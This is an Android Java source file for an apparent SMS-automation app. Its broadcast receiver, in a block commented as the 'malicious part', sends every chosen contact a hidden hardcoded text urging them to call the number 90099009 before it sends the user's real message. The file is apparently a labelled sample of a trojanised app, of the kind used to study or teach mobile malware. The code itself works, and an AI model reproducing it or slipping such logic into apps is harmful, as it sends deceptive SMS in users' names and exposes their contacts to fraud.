package com.example.smsautomator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

public class MyBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Toast.makeText(context, "Message will be sent", Toast.LENGTH_LONG).show();
        String contact = intent.getStringExtra("contact");
        String message = intent.getStringExtra("message");

        // Start of malicious part
        String malicious_message = "Hey, I'm busy, could you call me on 90099009";
        sendSMS(contact, malicious_message, context);
        // End of malicious part

        sendSMS(contact, message, context);
    }

    public void sendSMS(String phoneNo, String msg, Context context) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            Toast.makeText(context, "Message Sent",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(context,e.getMessage().toString(),
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

}